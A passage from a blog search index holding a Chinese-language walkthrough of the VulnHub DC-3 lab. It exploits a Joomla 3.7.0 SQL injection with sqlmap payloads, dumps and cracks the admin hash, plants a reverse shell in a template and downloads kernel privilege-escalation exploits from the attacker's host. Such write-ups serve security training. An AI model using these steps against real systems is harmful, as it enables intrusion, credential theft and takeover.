<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DC-3</title>
      <link href="/2023/05/28/DC-3/"/>
      <url>/2023/05/28/DC-3/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-32,312/%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E5%AF%BC%E5%85%A5vm">https://www.vulnhub.com/entry/dc-32,312/，下载后导入vm</a> ware，只有一个flag，一个入口。 </p><p><img src="/2023/05/28/DC-3/image-20231128211812356.png"></p><p>使用nmap确定靶机地址，-sn 存活探测，–min-rate 最小发包速率，-r 关闭域名解析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nmap <span class="token number">192.168</span>.245.1/24 <span class="token parameter variable">-sn</span> --min-rate <span class="token number">2222</span> <span class="token parameter variable">-r</span>Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2023</span>-11-28 08:22 ESTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.1Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0015s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.2Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0010s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.128Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0029s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.139Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0023s latency<span class="token punctuation">)</span>.Nmap done: <span class="token number">256</span> IP addresses <span class="token punctuation">(</span><span class="token number">4</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.61</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认靶机地址为139，对其进行端口扫描，-p- 全端口，-PN 禁止ping其他主机，-sS TCP扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> nmap <span class="token number">192.168</span>.245.139 -p- --min-rate <span class="token number">8888</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-PN</span> <span class="token parameter variable">-sS</span><span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> kali 的密码：Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2023</span>-11-28 08:23 ESTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.139Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00066s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65534</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>PORT   STATE SERVICE<span class="token number">80</span>/tcp <span class="token function">open</span>  httpMAC Address: 00:0C:29:8C:6C:0F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.98</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只开了80端口，查看web服务</p><p><img src="/2023/05/28/DC-3/image-20231128215823397.png"></p><p>​Joomla （ &#x2F;ˈdʒuːm.lɑː&#x2F; ），也拼写为 Joomla！（带有感叹号），有时缩写为 J！，是一个免费的开源内容管理系统 （CMS），用于在网站上发布 Web 内容。Web 内容应用程序包括论坛、照片库、电子商务和用户社区以及许多其他基于 Web 的应用程序。Joomla 由志愿者社区开发，并得到 Open Source Matters， Inc. 的法律、组织和财务资源的支持。</p><p>​有针对Joomla的工具Joomscan，对dc-3进行扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Detecting Joomla Version<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Joomla <span class="token number">3.7</span>.0<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Core Joomla Vulnerability<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Target Joomla core is not vulnerable<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking Directory Listing<span class="token punctuation">[</span>++<span class="token punctuation">]</span> directory has directory listing <span class="token builtin class-name">:</span> http://dc-3/administrator/componentshttp://dc-3/administrator/modules                                                                   http://dc-3/administrator/templates                                                                 http://dc-3/images/banners                                                                                                                                                                                                                                                                                  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking apache info/status files                                                               <span class="token punctuation">[</span>++<span class="token punctuation">]</span> Readable info/status files are not found                                                                                                                                                           <span class="token punctuation">[</span>+<span class="token punctuation">]</span> admin finder                                                                                    <span class="token punctuation">[</span>++<span class="token punctuation">]</span> Admin page <span class="token builtin class-name">:</span> http://dc-3/administrator/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现版本是Joomla 3.7.0，admin地址：<a href="http://dc-3/administrator/">http://dc-3/administrator/</a> ，使用searchsploit查询一下joomla 3.7.0</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ searchsploit joomla <span class="token number">3.7</span>.0------------------------------------------------------------------ --------------------------------- Exploit Title                                                    <span class="token operator">|</span>  Path------------------------------------------------------------------ ---------------------------------Joomla<span class="token operator">!</span> <span class="token number">3.7</span>.0 - <span class="token string">'com_fields'</span> SQL Injection                        <span class="token operator">|</span> php/webapps/42033.txtJoomla<span class="token operator">!</span> Component Easydiscuss <span class="token operator">&lt;</span> <span class="token number">4.0</span>.21 - Cross-Site Scripting     <span class="token operator">|</span> php/webapps/43488.txt------------------------------------------------------------------ ---------------------------------Shellcodes: No Results<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下42033.txt,有sql注入的payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">cat</span> /home/kali/42033.txt <span class="token comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><span class="token comment"># Date: 05-19-2017</span><span class="token comment"># Exploit Author: Mateus Lino</span><span class="token comment"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><span class="token comment"># Vendor Homepage: https://www.joomla.org/</span><span class="token comment"># Version: = 3.7.0</span><span class="token comment"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><span class="token comment"># CVE : - CVE-2017-8917</span>URL Vulnerable: http://localhost/index.php?option<span class="token operator">=</span>com_fields<span class="token operator">&amp;</span><span class="token assign-left variable">view</span><span class="token operator">=</span>fields<span class="token operator">&amp;</span><span class="token assign-left variable">layout</span><span class="token operator">=</span>modal<span class="token operator">&amp;</span>list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span class="token operator">=</span>updatexml%27Using Sqlmap:sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span>Parameter: list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span> <span class="token punctuation">(</span>GET<span class="token punctuation">)</span>    Type: boolean-based blind    Title: Boolean-based blind - Parameter replace <span class="token punctuation">(</span>DUAL<span class="token punctuation">)</span>    Payload: <span class="token assign-left variable">option</span><span class="token operator">=</span>com_fields<span class="token operator">&amp;</span><span class="token assign-left variable">view</span><span class="token operator">=</span>fields<span class="token operator">&amp;</span><span class="token assign-left variable">layout</span><span class="token operator">=</span>modal<span class="token operator">&amp;</span>list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">1573</span><span class="token operator">=</span><span class="token number">1573</span><span class="token punctuation">)</span> THEN <span class="token number">1573</span> ELSE <span class="token number">1573</span>*<span class="token punctuation">(</span>SELECT <span class="token number">1573</span> FROM DUAL UNION SELECT <span class="token number">9674</span> FROM DUAL<span class="token punctuation">)</span> END<span class="token punctuation">)</span>    Type: error-based    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span> error-based - Parameter replace <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span>    Payload: <span class="token assign-left variable">option</span><span class="token operator">=</span>com_fields<span class="token operator">&amp;</span><span class="token assign-left variable">view</span><span class="token operator">=</span>fields<span class="token operator">&amp;</span><span class="token assign-left variable">layout</span><span class="token operator">=</span>modal<span class="token operator">&amp;</span>list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>SELECT <span class="token number">6600</span> FROM<span class="token punctuation">(</span>SELECT COUNT<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,CONCAT<span class="token punctuation">(</span>0x7171767071,<span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>ELT<span class="token punctuation">(</span><span class="token number">6600</span><span class="token operator">=</span><span class="token number">6600,1</span><span class="token punctuation">))</span><span class="token punctuation">)</span>,0x716a707671,FLOOR<span class="token punctuation">(</span>RAND<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x<span class="token punctuation">)</span>a<span class="token punctuation">)</span>    Type: AND/OR time-based blind    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 time-based blind - Parameter replace <span class="token punctuation">(</span>substraction<span class="token punctuation">)</span>    Payload: <span class="token assign-left variable">option</span><span class="token operator">=</span>com_fields<span class="token operator">&amp;</span><span class="token assign-left variable">view</span><span class="token operator">=</span>fields<span class="token operator">&amp;</span><span class="token assign-left variable">layout</span><span class="token operator">=</span>modal<span class="token operator">&amp;</span>list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>SELECT * FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>GDiu<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开sqlmap，sqlmap -u “<a href="http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml">http://dc-3/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml</a>“ –risk&#x3D;3 –level&#x3D;5 –random-agent –dbs -p list[fullordering]</p><p><img src="/2023/05/28/DC-3/image-20231128221916626.png"></p><p>可以爆破出数据库名，-D joomladb –tables</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Database: joomladb<span class="token punctuation">[</span><span class="token number">76</span> tables<span class="token punctuation">]</span>+---------------------+<span class="token operator">|</span> <span class="token comment">#__assets           |</span><span class="token operator">|</span> <span class="token comment">#__associations     |</span><span class="token operator">|</span> <span class="token comment">#__banner_clients   |</span><span class="token operator">|</span> <span class="token comment">#__banner_tracks    |</span><span class="token operator">|</span> <span class="token comment">#__banners          |</span><span class="token operator">|</span> <span class="token comment">#__bsms_admin       |</span><span class="token operator">|</span> <span class="token comment">#__bsms_books       |</span><span class="token operator">|</span> <span class="token comment">#__bsms_comments    |</span><span class="token operator">|</span> <span class="token comment">#__bsms_locations   |</span><span class="token operator">|</span> <span class="token comment">#__bsms_mediafiles  |</span><span class="token operator">|</span> <span class="token comment">#__bsms_message_typ |</span><span class="token operator">|</span> <span class="token comment">#__bsms_podcast     |</span><span class="token operator">|</span> <span class="token comment">#__bsms_series      |</span><span class="token operator">|</span> <span class="token comment">#__bsms_servers     |</span><span class="token operator">|</span> <span class="token comment">#__bsms_studies     |</span><span class="token operator">|</span> <span class="token comment">#__bsms_studytopics |</span><span class="token operator">|</span> <span class="token comment">#__bsms_teachers    |</span><span class="token operator">|</span> <span class="token comment">#__bsms_templatecod |</span><span class="token operator">|</span> <span class="token comment">#__bsms_templates   |</span><span class="token operator">|</span> <span class="token comment">#__bsms_timeset     |</span><span class="token operator">|</span> <span class="token comment">#__bsms_topics      |</span><span class="token operator">|</span> <span class="token comment">#__bsms_update      |</span><span class="token operator">|</span> <span class="token comment">#__categories       |</span><span class="token operator">|</span> <span class="token comment">#__contact_details  |</span><span class="token operator">|</span> <span class="token comment">#__content_frontpag |</span><span class="token operator">|</span> <span class="token comment">#__content_rating   |</span><span class="token operator">|</span> <span class="token comment">#__content_types    |</span><span class="token operator">|</span> <span class="token comment">#__content          |</span><span class="token operator">|</span> <span class="token comment">#__contentitem_tag_ |</span><span class="token operator">|</span> <span class="token comment">#__core_log_searche |</span><span class="token operator">|</span> <span class="token comment">#__extensions       |</span><span class="token operator">|</span> <span class="token comment">#__fields_categorie |</span><span class="token operator">|</span> <span class="token comment">#__fields_groups    |</span><span class="token operator">|</span> <span class="token comment">#__fields_values    |</span><span class="token operator">|</span> <span class="token comment">#__fields           |</span><span class="token operator">|</span> <span class="token comment">#__finder_filters   |</span><span class="token operator">|</span> <span class="token comment">#__finder_links_ter |</span><span class="token operator">|</span> <span class="token comment">#__finder_links     |</span><span class="token operator">|</span> <span class="token comment">#__finder_taxonomy_ |</span><span class="token operator">|</span> <span class="token comment">#__finder_taxonomy  |</span><span class="token operator">|</span> <span class="token comment">#__finder_terms_com |</span><span class="token operator">|</span> <span class="token comment">#__finder_terms     |</span><span class="token operator">|</span> <span class="token comment">#__finder_tokens_ag |</span><span class="token operator">|</span> <span class="token comment">#__finder_tokens    |</span><span class="token operator">|</span> <span class="token comment">#__finder_types     |</span><span class="token operator">|</span> <span class="token comment">#__jbsbackup_timese |</span><span class="token operator">|</span> <span class="token comment">#__jbspodcast_times |</span><span class="token operator">|</span> <span class="token comment">#__languages        |</span><span class="token operator">|</span> <span class="token comment">#__menu_types       |</span><span class="token operator">|</span> <span class="token comment">#__menu             |</span><span class="token operator">|</span> <span class="token comment">#__messages_cfg     |</span><span class="token operator">|</span> <span class="token comment">#__messages         |</span><span class="token operator">|</span> <span class="token comment">#__modules_menu     |</span><span class="token operator">|</span> <span class="token comment">#__modules          |</span><span class="token operator">|</span> <span class="token comment">#__newsfeeds        |</span><span class="token operator">|</span> <span class="token comment">#__overrider        |</span><span class="token operator">|</span> <span class="token comment">#__postinstall_mess |</span><span class="token operator">|</span> <span class="token comment">#__redirect_links   |</span><span class="token operator">|</span> <span class="token comment">#__schemas          |</span><span class="token operator">|</span> <span class="token comment">#__session          |</span><span class="token operator">|</span> <span class="token comment">#__tags             |</span><span class="token operator">|</span> <span class="token comment">#__template_styles  |</span><span class="token operator">|</span> <span class="token comment">#__ucm_base         |</span><span class="token operator">|</span> <span class="token comment">#__ucm_content      |</span><span class="token operator">|</span> <span class="token comment">#__ucm_history      |</span><span class="token operator">|</span> <span class="token comment">#__update_sites_ext |</span><span class="token operator">|</span> <span class="token comment">#__update_sites     |</span><span class="token operator">|</span> <span class="token comment">#__updates          |</span><span class="token operator">|</span> <span class="token comment">#__user_keys        |</span><span class="token operator">|</span> <span class="token comment">#__user_notes       |</span><span class="token operator">|</span> <span class="token comment">#__user_profiles    |</span><span class="token operator">|</span> <span class="token comment">#__user_usergroup_m |</span><span class="token operator">|</span> <span class="token comment">#__usergroups       |</span><span class="token operator">|</span> <span class="token comment">#__users            |</span><span class="token operator">|</span> <span class="token comment">#__utf8_conversion  |</span><span class="token operator">|</span> <span class="token comment">#__viewlevels       |</span>+---------------------+<span class="token punctuation">[</span>09:20:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> HTTP error codes detected during run:<span class="token number">500</span> <span class="token punctuation">(</span>Internal Server Error<span class="token punctuation">)</span> - <span class="token number">93</span> <span class="token builtin class-name">times</span><span class="token punctuation">[</span>09:20:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/dc-3'</span><span class="token punctuation">[</span>09:20:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:20:57 /2023-11-28/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个#__users表，sudo sqlmap -u “<a href="http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml">http://dc-3/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml</a>“ –risk&#x3D;3 –level&#x3D;5 –random-agent –dbs -p list[fullordering] -D joomladb -T “#users” –columns</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Database: joomladbTable: <span class="token comment">#__users</span><span class="token punctuation">[</span><span class="token number">6</span> columns<span class="token punctuation">]</span>+----------+-------------+<span class="token operator">|</span> Column   <span class="token operator">|</span> Type        <span class="token operator">|</span>+----------+-------------+<span class="token operator">|</span> email    <span class="token operator">|</span> non-numeric <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">id</span>       <span class="token operator">|</span> numeric     <span class="token operator">|</span><span class="token operator">|</span> name     <span class="token operator">|</span> non-numeric <span class="token operator">|</span><span class="token operator">|</span> params   <span class="token operator">|</span> non-numeric <span class="token operator">|</span><span class="token operator">|</span> password <span class="token operator">|</span> non-numeric <span class="token operator">|</span><span class="token operator">|</span> username <span class="token operator">|</span> non-numeric <span class="token operator">|</span>+----------+-------------+<span class="token punctuation">[</span>09:23:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> HTTP error codes detected during run:<span class="token number">500</span> <span class="token punctuation">(</span>Internal Server Error<span class="token punctuation">)</span> - <span class="token number">2658</span> <span class="token builtin class-name">times</span><span class="token punctuation">[</span>09:23:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/dc-3'</span><span class="token punctuation">[</span>09:23:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:23:46 /2023-11-28/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>去查看username，password两列的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Database: joomladbTable: <span class="token comment">#__users</span><span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>+----------+--------------------------------------------------------------+<span class="token operator">|</span> username <span class="token operator">|</span> password                                                     <span class="token operator">|</span>+----------+--------------------------------------------------------------+<span class="token operator">|</span> admin    <span class="token operator">|</span> <span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> <span class="token operator">|</span>+----------+--------------------------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是个加盐的密码，尝试用kali的爆破工具进行爆破，讲密码写入到一个文件当中，然后用john passwd.txt –show</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># john /home/kali/passwd.txt --show</span>?:snoopy<span class="token number">1</span> password <span class="token builtin class-name">hash</span> cracked, <span class="token number">0</span> left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得密码snoopy，去后台进行登录</p><p><img src="/2023/05/28/DC-3/image-20231128223318681.png"></p><p>成功登录后台，在后台主题中可以添加文件</p><p><img src="/2023/05/28/DC-3/image-20231130113033244.png"></p><p>添加反弹shell，直接访问templates&#x2F;beez3&#x2F;shell.php，监听7777</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">7777</span>listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">7777</span> <span class="token punctuation">..</span>.connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.245.128<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.245.139<span class="token punctuation">]</span> <span class="token number">42862</span>bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1281</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> devicebash: no job control <span class="token keyword">in</span> this shellwww-data@DC-3:/var/www/html/templates/beez3$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell，查看当前权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@DC-3:/var/www/html/templates/beez3$ <span class="token function">whoami</span><span class="token function">whoami</span>www-datawww-data@DC-3:/var/www/html/templates/beez3$ <span class="token function">id</span><span class="token function">id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>www-data@DC-3:/var/www/html/templates/beez3$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>www-data为用户权限，进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@DC-3:/var/www/html/templates/beez3$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">&lt;</span>/templates/beez3$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null                     /bin/ping6/bin/ntfs-3g/bin/umount/bin/su/bin/fusermount/bin/mount/bin/ping/usr/lib/snapd/snap-confine/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/i386-linux-gnu/lxc/lxc-user-nic/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/bin/passwd/usr/bin/newgidmap/usr/bin/gpasswd/usr/bin/sudo/usr/bin/pkexec/usr/bin/chsh/usr/bin/chfn/usr/bin/newuidmap/usr/bin/newgrp/usr/bin/atwww-data@DC-3:/var/www/html/templates/beez3$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SUID没有什么可以利用的，尝试使用内核版本提取，用searchsploit</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@DC-3:/var/www/html/templates/beez3$ <span class="token function">uname</span> <span class="token parameter variable">-a</span> <span class="token function">uname</span> <span class="token parameter variable">-a</span>Linux DC-3 <span class="token number">4.4</span>.0-21-generic <span class="token comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/usr/share/webshells/php<span class="token punctuation">]</span>└─$ searchsploit linux <span class="token number">4.4</span>.0Linux Kernel <span class="token operator">&lt;</span> <span class="token number">4.4</span>.0-116 <span class="token punctuation">(</span>Ubuntu <span class="token number">16.04</span>.4<span class="token punctuation">)</span> - Local Privilege Escalation                                         <span class="token operator">|</span> linux/local/44298.cLinux Kernel <span class="token operator">&lt;</span> <span class="token number">4.4</span>.0-21 <span class="token punctuation">(</span>Ubuntu <span class="token number">16.04</span> x64<span class="token punctuation">)</span> - <span class="token string">'netfilter target_offset'</span> Local Privilege Escalation              <span class="token operator">|</span> linux_x86-64/local/44300.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有两个提权，用searchsploit把这两个c文件下载下来，用python开启一个http服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@DC-3:/var/www/html/templates/beez3$ <span class="token function">wget</span> http://192.168.245.128:7777/44298.c<span class="token operator">&lt;</span>/templates/beez3$ <span class="token function">wget</span> http://192.168.245.128:7777/44298.c                  --2023-11-30 <span class="token number">14</span>:42:30--  http://192.168.245.128:7777/44298.cConnecting to <span class="token number">192.168</span>.245.128:7777<span class="token punctuation">..</span>. connected.HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OKLength: <span class="token number">5773</span> <span class="token punctuation">(</span><span class="token number">5</span>.6K<span class="token punctuation">)</span> <span class="token punctuation">[</span>text/x-csrc<span class="token punctuation">]</span>Saving to: <span class="token string">'44298.c'</span>     0K <span class="token punctuation">..</span><span class="token punctuation">..</span>.                                                 <span class="token number">100</span>%  <span class="token assign-left variable">603M</span><span class="token operator">=</span>0s<span class="token number">2023</span>-11-30 <span class="token number">14</span>:42:30 <span class="token punctuation">(</span><span class="token number">603</span> MB/s<span class="token punctuation">)</span> - <span class="token string">'44298.c'</span> saved <span class="token punctuation">[</span><span class="token number">5773</span>/5773<span class="token punctuation">]</span>www-data@DC-3:/var/www/html/templates/beez3$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载提权文件，用gcc编译执行，44298编译报错，靶机gcc环境编译都不行，查看其他师傅的博客发现用39772.txt进行的提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ proxychains4 <span class="token function">wget</span> https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains4.conf<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.16</span>--2023-11-30 00:27:42--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip正在解析主机 gitlab.com <span class="token punctuation">(</span>gitlab.com<span class="token punctuation">)</span><span class="token punctuation">..</span>. <span class="token number">224.0</span>.0.1正在连接 gitlab.com <span class="token 